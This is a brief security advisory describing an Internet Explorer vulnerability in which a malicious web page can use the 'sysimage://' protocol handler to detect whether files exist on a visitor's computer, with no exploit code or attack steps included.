Microsoft Internet Explorer is reported prone to a vulnerability that may allow a remote site to detect files on the local computer.

A remote attacker can exploit this issue through the ''sysimage://' protocol handler to detect the existence of a file on the local computer of the Web client viewing a malicious page. This could lead to a disclosure of sensitive information to remote attackers.
